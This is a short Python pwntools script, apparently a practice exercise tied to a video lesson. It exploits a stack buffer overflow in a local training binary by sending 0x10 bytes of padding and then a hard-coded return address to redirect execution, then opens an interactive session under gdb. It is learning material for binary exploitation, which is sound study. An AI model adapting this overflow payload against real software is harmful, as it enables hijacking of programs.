'''
Author: Jack Jparrow
Date: 2022-08-24 17:35:07
LastEditTime: 2022-08-25 17:20:48
LastEditors: Jack Jparrow
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=15&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=1043.2
'''

from pwn import *

context(log_level = 'debug', arch = 'amd64', os = 'linux')

pwnfile = './question_4_1_x86'
io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x10

gdb.attach(io)
pause()

return_addr = 0x401142

payload = flat(['a' * padding, return_addr])

delimiter = 'input:'

io.sendlineafter(delimiter, payload)
io.interactive()